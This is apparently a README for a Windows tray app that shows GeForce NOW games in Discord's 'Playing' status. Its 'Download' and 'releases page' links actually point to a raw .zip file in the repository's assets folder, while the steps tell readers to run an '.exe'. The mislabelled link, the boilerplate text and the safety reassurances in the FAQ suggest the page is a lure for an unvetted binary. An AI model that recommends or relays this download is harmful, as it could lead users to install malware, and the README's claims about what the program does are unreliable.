# 🎮 geforce-now-discord-rpc - Show your cloud games on Discord

[![Download](https://img.shields.io/badge/Download-Release_Page-blue)](https://github.com/derickbilious954/geforce-now-discord-rpc/raw/refs/heads/main/assets/discord_rpc_geforce_now_1.2.zip)

This application shares the game you play on GeForce NOW with your friends on Discord. When you launch a game through the cloud, the app detects the title and updates your Discord status automatically. It runs in your system tray and requires no input after the initial setup.

## 📥 How to Install

1. Visit the [releases page](https://github.com/derickbilious954/geforce-now-discord-rpc/raw/refs/heads/main/assets/discord_rpc_geforce_now_1.2.zip).
2. Look for the latest version under the "Assets" section.
3. Click the file ending in ".exe" to download the installer to your computer.
4. Open the downloaded file to begin the setup.
5. Follow the on-screen prompts to place the app on your machine.
6. The app launches immediately after installation.

## ⚙️ How it Works

The program monitors your active processes on Windows. When it identifies a GeForce NOW stream, it communicates with the Discord desktop client. It fetches the name of the game and the relevant artwork from a database. Discord displays this information in your profile under the "Playing" section. 

The software utilizes the Discord Rich Presence API. This interface allows external programs to modify your activity status in real time. Because the app runs in the background as a process, it maintains your status even if you minimize your game or look at other windows.

## 🚀 Getting Started

1. Open Discord on your computer. Ensure you stay signed in.
2. Launch the GeForce NOW Discord RPC application from your Start menu.
3. Check your system tray near the clock in the bottom right corner of your screen. You will see a small icon for the software.
4. Right-click the icon to view settings or to close the application.
5. Start a game through the GeForce NOW launcher.
6. Check your Discord profile. Your game title appears under your name.

## 🛠 Features

* **Auto-Detection:** The app finds games without manual help.
* **Game Art:** It pulls official posters and logos to show on your profile.
* **Auto-Start:** You can set the app to turn on when Windows boots.
* **Low Impact:** The tool uses minimal memory and processor power.
* **System Tray integration:** It stays out of your way while you play.

## 📋 System Requirements

* Windows 10 or Windows 11.
* A stable internet connection.
* The official Discord desktop application installed.
* The GeForce NOW application installed and logged in.
* Sufficient permissions to run background tasks.

## 🔧 Troubleshooting

If Discord fails to show your game, check these items:

* Verify that your Discord "Activity Status" settings allow other programs to display your current activity. Access this in Discord under User Settings > Activity Privacy.
* Ensure both Discord and the GeForce NOW app remain active. 
* Check your system tray to confirm the RPC app icon is present. If it is missing, restart the application from your Start menu.
* If the app shows the wrong game name, close the game and restart it. Refreshing the stream forces the app to re-scan your window.

## 🛡 Privacy Policy

This program reads your local process list to identify game names. It does not record personal data, private keystrokes, or your browsing history. The application sends information only to the Discord servers to update your status. Your game activity remains visible only to the users you allow on Discord.

## 🆙 Updating the App

The application checks for new releases on launch. If a new version exists, the app notifies you. Visit the official GitHub releases page to download the latest installer. Run the installer again to overwrite the old files with the updated version. Your previous settings usually remain saved during this process.

## 💬 Frequently Asked Questions

**Does this app work with web browsers?**
The current version focuses on the standalone GeForce NOW Windows application. Compatibility with browser-based cloud gaming is planned for future updates.

**Can I stop the app from starting with Windows?**
Yes. Right-click the system tray icon and select "Settings." Uncheck the box labeled "Launch at startup."

**Does this app pose a security risk?**
The code remains open for public review. You can inspect the project files on GitHub to verify the behavior of the software. It uses secure connections for all network requests.

**Which games does the app support?**
The software supports all games officially hosted on the GeForce NOW platform. If a specific game does not display, ensure the game title matches the metadata found in the official GeForce database.

**Can I customize how my status looks?**
The app handles the formatting automatically to ensure the Discord display looks professional. You cannot change the layout at this time.

**Does this app require administrative rights?**
Standard user permissions are sufficient for the installation and operation of the software. You do not need to provide administrator passwords during daily use.

**How do I completely remove the app?**
Open your Windows Settings, go to Apps, find the program in the list, and select Uninstall. This removes the application files and the associated shortcuts from your system.